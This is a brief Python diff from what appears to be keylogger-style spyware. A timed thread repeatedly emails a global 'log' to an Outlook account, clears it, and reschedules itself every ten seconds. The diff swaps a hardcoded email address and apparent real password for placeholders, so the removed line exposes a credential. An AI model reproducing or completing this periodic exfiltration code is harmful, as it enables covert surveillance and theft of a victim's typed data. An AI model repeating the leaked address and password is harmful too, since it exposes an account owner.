@@ -32,7 +32,7 @@ def send_mail(email,psswd):
 
 def thread_function():
     global log
-    send_mail("alpjason776@outlook.com","Alp5412019")
+    send_mail("youradress@outlook.com","yourpassword")
     log = ""
     timer_object = threading.Timer(10,thread_function)
     timer_object.start()
